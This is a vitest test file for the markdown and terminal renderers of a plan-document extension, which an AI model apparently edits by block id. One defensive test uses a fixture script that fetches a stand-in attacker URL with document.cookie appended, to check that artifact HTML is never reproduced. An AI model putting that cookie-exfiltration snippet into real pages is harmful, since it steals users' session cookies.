/**
 * Markdown and TUI renders.
 *
 * Two things are load-bearing here and easy to lose in a refactor.
 *
 * Block ids must survive the markdown render. The model addresses blocks by id
 * on the next patch, and it reads them back out of the rendered plan in the
 * tool result — an id-less render silently forces whole-document rewrites, the
 * exact failure this design exists to avoid.
 *
 * Problems must precede the plan in a tool result. A model that has to read
 * past a rendered plan to notice three rejected ops usually does not, and then
 * re-states the plan it believes it wrote.
 */

import { describe, expect, it } from "vitest";
import { planToMarkdown, renderOpResult, renderStepList, summaryLine } from "../extensions/plan/render.ts";
import { applyOps, emptyPlan, type PlanDoc } from "../extensions/plan/state.ts";

const NOW = 1_700_000_000_000;

const build = (...ops: Parameters<typeof applyOps>[1]): PlanDoc => applyOps(emptyPlan(NOW), ops, NOW).doc;

describe("planToMarkdown", () => {
	it("renders the header with phase, revision and step progress", () => {
		const doc = build(
			{ op: "header", title: "Ship the gate", goal: "Deny writes in plan mode" },
			{ op: "upsert", block: { type: "steps", steps: [{ title: "a" }, { title: "b" }] } },
		);
		const ticked = applyOps(doc, [{ op: "set_step", id: "1", status: "done" }], NOW).doc;
		const md = planToMarkdown(ticked);

		expect(md).toContain("# Ship the gate");
		expect(md).toContain("**Goal.** Deny writes in plan mode");
		expect(md).toContain("steps: 1/2 done");
	});

	it("keeps block ids in the render so the next patch can address them", () => {
		const doc = build({ op: "upsert", block: { type: "text", title: "Context", markdown: "why" } });
		expect(planToMarkdown(doc)).toContain("#1");
	});

	it("omits ids when exporting for humans", () => {
		const doc = build({ op: "upsert", block: { type: "text", title: "Context", markdown: "why" } });
		expect(planToMarkdown(doc, { includeIds: false })).not.toContain("#1");
	});

	it("renders steps as checkboxes reflecting status", () => {
		const doc = build({
			op: "upsert",
			block: {
				type: "steps",
				steps: [
					{ id: "1", title: "done one", status: "done" },
					{ id: "2", title: "doing one", status: "in_progress" },
					{ id: "3", title: "blocked one", status: "blocked" },
					{ id: "4", title: "todo one" },
				],
			},
		});
		const md = planToMarkdown(doc);
		expect(md).toContain("[x] `1` done one");
		expect(md).toContain("[~] `2` doing one");
		expect(md).toContain("[!] `3` blocked one");
		expect(md).toContain("[ ] `4` todo one");
	});

	it("renders a step note as its own line, so divergence is not buried", () => {
		const base = build({ op: "upsert", block: { type: "steps", steps: [{ title: "migrate" }] } });
		const doc = applyOps(base, [{ op: "set_step", id: "1", note: "needed a backfill first" }], NOW).doc;
		expect(planToMarkdown(doc)).toContain("↳ _needed a backfill first_");
	});

	it("fences a diagram as mermaid", () => {
		const doc = build({ op: "upsert", block: { type: "diagram", mermaid: "graph TD; A-->B" } });
		const md = planToMarkdown(doc);
		expect(md).toContain("```mermaid");
		expect(md).toContain("graph TD; A-->B");
	});

	it("renders a chart as data with a scaled bar", () => {
		// Markdown has no charts. The honest fallback is the numbers, which is
		// exactly what the block stores — a viewer that can draw gets the same data.
		const doc = build({
			op: "upsert",
			block: {
				type: "chart",
				chart: "bar",
				series: [
					{ label: "backend", value: 8 },
					{ label: "frontend", value: 4 },
				],
				unit: "hours",
			},
		});
		const md = planToMarkdown(doc);
		expect(md).toContain("backend");
		expect(md).toContain("8 hours");
		expect(md).toContain("4 hours");
		expect(md).toContain("█");
		// Scaled to the largest value, so one outlier cannot flatten the rest.
		expect(md).toMatch(/frontend\s+█+·+/);
	});

	it("does not divide by zero on an all-zero series", () => {
		const doc = build({
			op: "upsert",
			block: { type: "chart", chart: "bar", series: [{ label: "none", value: 0 }] },
		});
		expect(() => planToMarkdown(doc)).not.toThrow();
		expect(planToMarkdown(doc)).toContain("none");
	});

	it("renders a table and escapes pipes in cells", () => {
		const doc = build({
			op: "upsert",
			block: { type: "table", columns: ["option", "note"], rows: [["a|b", "has a pipe"]] },
		});
		const md = planToMarkdown(doc);
		expect(md).toContain("| option | note |");
		expect(md).toContain("a\\|b");
	});

	it("renders refs as links when a url is present and plain text otherwise", () => {
		const doc = build({
			op: "upsert",
			block: {
				type: "refs",
				refs: [
					{ label: "HIV-1150", url: "https://linear.app/x", kind: "linear" },
					{ label: "extensions/plan/state.ts", kind: "file" },
				],
			},
		});
		const md = planToMarkdown(doc);
		expect(md).toContain("[HIV-1150](https://linear.app/x)");
		expect(md).toContain("extensions/plan/state.ts");
	});

	// The whole safety of an artifact is that its document only ever reaches a
	// sandboxed frame. This render feeds a Linear description, a PR body and the
	// model's own tool result — none of which has a sandbox — so the markdown
	// must describe the artifact and never reproduce it.
	it("describes an artifact without reproducing its html", () => {
		const html = '<!doctype html><script>fetch("https://evil.example/" + document.cookie)</script>';
		const md = planToMarkdown(build({ op: "upsert", block: { type: "artifact", html, caption: "the new card" } }));
		expect(md).not.toContain("<script>");
		expect(md).not.toContain("evil.example");
		expect(md).toContain("Interactive artifact");
		expect(md).toContain("the new card");
		expect(md).toContain(String(html.length));
	});

	it("fences a code block with its language", () => {
		const md = planToMarkdown(build({ op: "upsert", block: { type: "code", language: "go", code: "func main() {}" } }));
		expect(md).toContain("```go");
		expect(md).toContain("func main() {}");
	});

	it("renders a callout with its tone", () => {
		const doc = build({ op: "upsert", block: { type: "callout", tone: "risk", markdown: "this can drop data" } });
		expect(planToMarkdown(doc)).toContain("**RISK**");
	});
});

describe("summaryLine", () => {
	it("is undefined for an empty plan, so the widget is removed rather than blanked", () => {
		expect(summaryLine(emptyPlan(NOW))).toBeUndefined();
	});

	it("reports phase and progress", () => {
		const doc = build(
			{ op: "header", title: "x" },
			{ op: "upsert", block: { type: "steps", steps: [{ title: "a" }, { title: "b" }] } },
		);
		const ticked = applyOps(doc, [{ op: "set_step", id: "1", status: "in_progress" }], NOW).doc;
		const line = summaryLine(ticked);
		expect(line).toContain("0/2 done");
		expect(line).toContain("1 active");
	});
});

describe("renderOpResult", () => {
	it("puts problems before the plan", () => {
		const doc = build({ op: "upsert", block: { type: "text", markdown: "ok" } });
		const result = applyOps(doc, [{ op: "remove", id: "nope" }], NOW);
		const rendered = renderOpResult(result, result.doc);
		expect(rendered.indexOf("problem(s)")).toBeLessThan(rendered.indexOf("# "));
	});

	it("says plainly when nothing applied", () => {
		const doc = build({ op: "upsert", block: { type: "text", markdown: "ok" } });
		const result = applyOps(doc, [{ op: "remove", id: "nope" }], NOW);
		expect(renderOpResult(result, result.doc)).toContain("No changes applied.");
	});

	it("lists what changed", () => {
		const doc = build({ op: "upsert", block: { type: "text", markdown: "ok" } });
		const result = applyOps(doc, [{ op: "upsert", block: { type: "text", markdown: "two" } }], NOW);
		expect(renderOpResult(result, result.doc)).toContain("created 2");
	});

	it("reports dangling blockers without repairing them", () => {
		const doc = build({
			op: "upsert",
			block: { type: "steps", steps: [{ id: "1", title: "a", blockedBy: ["99"] }] },
		});
		const result = applyOps(doc, [{ op: "set_step", id: "1", status: "in_progress" }], NOW);
		expect(renderOpResult(result, result.doc)).toContain("waits on 99");
	});
});

describe("renderStepList", () => {
	it("explains an empty plan rather than rendering nothing", () => {
		expect(renderStepList(emptyPlan(NOW))).toBe("The plan has no steps yet.");
	});

	it("lists steps with status words and owners", () => {
		const base = build({ op: "upsert", block: { type: "steps", steps: [{ title: "wire it" }] } });
		const doc = applyOps(base, [{ op: "set_step", id: "1", status: "in_progress", owner: "w1" }], NOW).doc;
		const list = renderStepList(doc);
		expect(list).toContain("wire it");
		expect(list).toContain("(@w1)");
		expect(list).toContain("in progress");
	});
});
